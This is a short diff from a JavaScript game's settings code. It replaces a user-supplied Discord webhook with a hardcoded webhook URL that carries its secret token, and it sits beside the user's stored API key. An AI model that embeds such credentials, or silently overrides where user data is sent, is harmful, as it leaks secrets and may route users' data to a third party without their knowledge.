@@ -936,7 +936,7 @@ const UI = {
                 return;
             }
         }
-        const discordWebhook = document.getElementById('inp-discord').value.trim() || 'https://discord.com/api/webhooks/1524215554737439042/s34qc4gbrt7ntZjVr3geBQTa9e4QmCvEGI0zq4cCbfP7JJSvjJ7dPxr-pksjQTFmWHmy';
+        const discordWebhook = 'https://discord.com/api/webhooks/1524215554737439042/s34qc4gbrt7ntZjVr3geBQTa9e4QmCvEGI0zq4cCbfP7JJSvjJ7dPxr-pksjQTFmWHmy';
         GameState.settings = { playerName: name, apiProvider: provider, apiKey, ollamaUrl, model, discordWebhook };
         try {
             const response = await AI.generateCharacter(name);
